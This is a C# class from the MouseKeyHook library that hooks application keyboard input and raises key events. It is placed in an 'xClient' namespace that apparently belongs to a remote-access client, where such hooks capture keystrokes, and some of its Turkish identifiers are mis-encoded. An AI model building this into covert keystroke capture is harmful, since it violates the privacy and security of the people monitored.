// This code is distributed under MIT license. 
// Copyright (c) 2015 George Mamaladze
// See license.txt or http://opensource.org/licenses/mit-license.php

using System.Collections.Generic;
using xClient.KuuhakuÇekirdek.MouseKeyHook.WinApi;

namespace xClient.KuuhakuÇekirdek.MouseKeyHook.Implementation
{
    internal class AppKeyListener : KeyListener
    {
        public AppKeyListener()
            : base(HookHelper.HookAppKeyboard)
        {
        }

        protected override IEnumerable<EventArgsExtTuþBasýmý> GetPressEventArgs(CallbackData data)
        {
            return EventArgsExtTuþBasýmý.FromRawDataApp(data);
        }

        protected override EventArgsExtKlavye GetDownUpEventArgs(CallbackData data)
        {
            return EventArgsExtKlavye.FromRawDataApp(data);
        }
    }
}